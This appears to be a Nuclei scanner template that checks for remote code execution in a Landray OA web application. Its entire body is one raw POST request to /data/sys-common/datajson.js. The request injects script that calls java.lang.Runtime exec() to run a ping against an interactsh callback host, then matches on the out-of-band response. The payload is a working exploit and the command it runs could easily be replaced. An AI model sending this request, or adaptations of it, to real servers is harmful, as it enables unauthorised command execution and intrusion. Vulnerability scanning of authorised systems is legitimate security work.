id: langlingOARCE

info:
  name: langlingOARCE
  author: Momika233
  severity: high
  reference:
    - https://github.com/momika233
  tags: langlingOARCE

requests:
  - raw:
      - |
        POST /data/sys-common/datajson.js HTTP/1.1
        Host: {{Hostname}}

        s_bean=sysFormulaSimulateByJS&script=function%20test(){%20return%20java.lang.Runtime};r=test();r.getRuntime().exec(%22ping%20-c%203%20.{{interactsh-url}}%22)&type=1
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
